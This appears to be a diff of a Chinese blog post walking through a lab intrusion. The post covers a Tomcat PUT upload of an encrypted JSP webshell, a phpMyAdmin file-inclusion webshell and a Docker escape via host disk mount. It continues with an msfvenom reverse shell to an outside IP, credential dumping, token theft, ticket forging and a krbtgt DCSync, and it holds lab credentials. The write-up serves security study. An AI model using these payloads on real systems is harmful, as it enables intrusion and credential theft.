@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/favicon.ico">
 <meta property="article:published_time" content="2024-11-12T09:30:16.000Z">
-<meta property="article:modified_time" content="2024-11-12T15:29:44.534Z">
+<meta property="article:modified_time" content="2024-11-12T15:41:22.014Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -194,7 +194,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1731425384534"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1731426082014"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -215,7 +215,7 @@
 <p>先挑tomcat服务来打，<a target="_blank" rel="noopener" href="http://poc.py">poc.py</a>：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">body = <span class="string">&#x27;&#x27;&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%!</span></span><br><span class="line"><span class="string">    class U extends ClassLoader &#123;</span></span><br><span class="line"><span class="string">        U(ClassLoader c) &#123;</span></span><br><span class="line"><span class="string">            super(c);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        public Class g(byte[] b) &#123;</span></span><br><span class="line"><span class="string">            return super.defineClass(b, 0, b.length);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&lt;%</span></span><br><span class="line"><span class="string">    if (request.getMethod().equals(&quot;POST&quot;)) &#123;</span></span><br><span class="line"><span class="string">        String k = &quot;e45e329feb5d925b&quot;;</span></span><br><span class="line"><span class="string">        session.putValue(&quot;u&quot;, k);</span></span><br><span class="line"><span class="string">        Cipher c = Cipher.getInstance(&quot;AES&quot;);</span></span><br><span class="line"><span class="string">        c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));</span></span><br><span class="line"><span class="string">        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url= <span class="string">&quot;http://192.168.227.130:2002/&quot;</span></span><br><span class="line">filename = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))</span><br><span class="line">res = requests.put(url = url + <span class="string">&quot;/&quot;</span> + filename+ <span class="string">&#x27;.jsp/&#x27;</span> ,data=body)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]shell: <span class="subst">&#123;filename&#125;</span>.jsp&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p>冰蝎连接，密码为<code>rebeyond</code></p>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/58068/2.png" class title="awa">
 <p>可以看到这是一个docker环境：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/docker-java-home/jre</span><br></pre></td></tr></table></figure>
 <p>这里接着看其他服务的攻击方式，后续操作先按下不表</p>
@@ -223,7 +223,7 @@
 <p>fscan很明显能够扫出：<code>cve-2018-12613-file-inclusion</code></p>
 <p>poc如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx.com/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/58068/3.png" class title="awa">
 <p>此时可以先写shell，再利用该漏洞包含，利用步骤如下：</p>
 <ul>
 <li>先执行sql语句<code>SELECT &quot;&lt;?php phpinfo();?&gt;&quot;</code></li>
@@ -235,23 +235,23 @@
 <ul>
 <li>再写入webshell</li>
 </ul>
-<img src="/posts/undefined/4.png" class title="awa">
+<img src="/posts/58068/4.png" class title="awa">
 <p>此时我们重新写一个webshell：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php file_put_contents(&#x27;/var/www/html/cmd.php&#x27;,&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;)?&gt;&quot;</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/5.png" class title="awa">
+<img src="/posts/58068/5.png" class title="awa">
 <p>成功得到<code>www-data</code>用户shell，准备后续继续利用。</p>
 <h2><span id="struts2"> struts2</span></h2>
 <p>使用liqunkit进行检测：</p>
-<img src="/posts/undefined/6.png" class title="awa">
+<img src="/posts/58068/6.png" class title="awa">
 <p>成功利用</p>
-<img src="/posts/undefined/7.png" class title="awa">
+<img src="/posts/58068/7.png" class title="awa">
 <p>后续上传不了webshell，遂放弃</p>
 <h1><span id="docker逃逸"> docker逃逸</span></h1>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12495?time__1311=GqGxRQq7qeuDlrzQ0%3DGO7D87QPY53G8Qm7eD#toc-0">https://xz.aliyun.com/t/12495?time__1311=GqGxRQq7qeuDlrzQ0%3DGO7D87QPY53G8Qm7eD#toc-0</a></p>
 <p>首先判断是否为docker环境，tomcat处我们已经判断出来是docker环境了：</p>
 <p>查找<code>.dockerenv</code></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /.dockerenv</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/8.png" class title="awa">
+<img src="/posts/58068/8.png" class title="awa">
 <p>可以看到phpmyadmin也是docker环境</p>
 <p>接下来看是否为特权模式</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/status | grep Cap</span><br></pre></td></tr></table></figure>
@@ -266,7 +266,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
 <p>查看磁盘文件后可以得出磁盘文件名为<code>/dev/sda1</code>，对其进行挂载：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir test</span><br><span class="line">mount /dev/sda1 test</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/58068/9.png" class title="awa">
 <p>挂载成功</p>
 <p>挂载好后可以对文件进行操作，但是不能做别的事情。此时可以想着去添加一个ssh或者是修改<code>/etc/passwd</code>和<code>/etc/shadow</code>了（root权限的shell挂载之后也是root权限的文件操作</p>
 <p>由于添加ssh的操作比较麻烦，这里选择添加<code>/etc/passwd</code>和<code>/etc/shodow</code></p>
@@ -281,12 +281,12 @@
 <p>直接狂按<code>enter</code>，会生成没有密码的keygen，再覆盖<code>/home/ubuntu/.ssh/authorized_keys</code></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp -avx test/home/ubuntu/.ssh/id_rsa.pub test/home/ubuntu/.ssh/authorized_keys # -avx是将权限也一起复制</span><br><span class="line">echo &gt; test/home/ubuntu/.ssh/authorized_keys # 清空authorized_keys文件</span><br><span class="line">echo &#x27;生成的.pub文件的内容&#x27; &gt; test/home/ubuntu/.ssh/authorized_keys # 将ssh秘钥写入authorized_keys文件</span><br></pre></td></tr></table></figure>
 <p>接下来可以使用自己的私钥登录宿主机</p>
-<img src="/posts/undefined/10.png" class title="awa">
+<img src="/posts/58068/10.png" class title="awa">
 <p>登录成功后可以看到用户是ubuntu，权限不是root，接下来考虑提权到root</p>
 <p>查看<code>/etc/sudoers</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/tmp/ &gt;cat test/etc/sudoers</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span><br><span class="line">#</span><br><span class="line"># Please consider adding local content in /etc/sudoers.d/ instead of</span><br><span class="line"># directly modifying this file.</span><br><span class="line">#</span><br><span class="line"># See the man page for details on how to write a sudoers file.</span><br><span class="line">#</span><br><span class="line">Defaults	env_reset</span><br><span class="line">Defaults	mail_badpass</span><br><span class="line">Defaults	secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&quot;</span><br><span class="line"></span><br><span class="line"># Host alias specification</span><br><span class="line"></span><br><span class="line"># User alias specification</span><br><span class="line"></span><br><span class="line"># Cmnd alias specification</span><br><span class="line"></span><br><span class="line"># User privilege specification</span><br><span class="line">root	ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># Members of the admin group may gain root privileges</span><br><span class="line">%admin ALL=(ALL) ALL</span><br><span class="line"></span><br><span class="line"># Allow members of group sudo to execute any command</span><br><span class="line">%sudo	ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"># See sudoers(5) for more information on &quot;#include&quot; directives:</span><br><span class="line"></span><br><span class="line">#includedir /etc/sudoers.d</span><br></pre></td></tr></table></figure>
 <p>当然其实也可以直接爆破hash：</p>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/58068/11.png" class title="awa">
 <p>得到密码为<code>ubuntu</code>后就可以进入root了：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure>
 <p>ifconfig发现52网段：</p>
@@ -294,15 +294,15 @@
 <p>先弹msf：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=8.138.127.74 LPORT=2333 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
 <p>下载elf，直接用冰蝎传也行，也可以直接wget</p>
-<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/58068/12.png" class title="awa">
 <p>弹msf：</p>
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/58068/13.png" class title="awa">
 <p>成功</p>
 <h1><span id="打内网"> 打内网</span></h1>
 <p>先上fscan扫描52网段，发现dc扫不出来，最后还是改成了183网段</p>
-<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/58068/14.png" class title="awa">
 <p>这次试frp内网穿透</p>
-<img src="/posts/undefined/15.png" class title="awa">
+<img src="/posts/58068/15.png" class title="awa">
 <p>frpc通过远程服务器的6002走socks5，通过6001连接frps</p>
 <p>proxychains添加代理：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 6002</span><br></pre></td></tr></table></figure>
@@ -311,10 +311,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:127.0.0.1:6002</span><br></pre></td></tr></table></figure>
 <p>注意由于我们设置了内网穿透，这里的payload要设置成正向连接：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.183.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/16.png" class title="awa">
+<img src="/posts/58068/16.png" class title="awa">
 <p>收集一波信息：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/17.png" class title="awa">
+<img src="/posts/58068/17.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">douser        DEMO    Dotest123</span><br></pre></td></tr></table></figure>
 <h2><span id="拿下dc"> 拿下dc</span></h2>
 <p>那接下来要怎么打dc呢？</p>
@@ -343,11 +343,11 @@
 </ul>
 <p>我们已经知道一个用户<code>douser</code>的账号密码了，并且<code>systeminfo</code>得到的域名是<code>Domain:                    demo.com</code>，接下来可以去尝试获得它的SID</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/18.png" class title="awa">
+<img src="/posts/58068/18.png" class title="awa">
 <p>但是我们获得的却是system的sid，权限太高了，我们要手动降一下权限，可以利用msf的<code>steal_token</code>来偷取进程：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; steal_token 2244</span><br><span class="line">Stolen token with username: DEMO\douser</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/19.png" class title="awa">
-<img src="/posts/undefined/20.png" class title="awa">
+<img src="/posts/58068/19.png" class title="awa">
+<img src="/posts/58068/20.png" class title="awa">
 <p>此时获取到SID：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-979886063-1111900045-1414766810-1107</span><br></pre></td></tr></table></figure>
 <p>此时万事俱备：</p>
@@ -361,11 +361,11 @@
 <p>最后验证：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>
 <p>发现msf的票据不行，还得是exe生成的</p>
-<img src="/posts/undefined/22.png" class title="awa">
+<img src="/posts/58068/22.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc &lt;生成的票据文件&gt; //将票据注入到内存中</span><br></pre></td></tr></table></figure>
 <p>后面用mimikatz的lsadump抓krbtgt的哈希</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:krbtgt /domain:demo.com</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/23.png" class title="awa">
+<img src="/posts/58068/23.png" class title="awa">
 </div>
         </div>
         
@@ -457,7 +457,7 @@
                     <a class="tag-none-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-11-12T15:29:44.534Z" itemprop="dateModified">最后编辑：2024-11-12</time>
+                    <time datetime="2024-11-12T15:41:22.014Z" itemprop="dateModified">最后编辑：2024-11-12</time>
                 </div>
             </div>
         </footer>
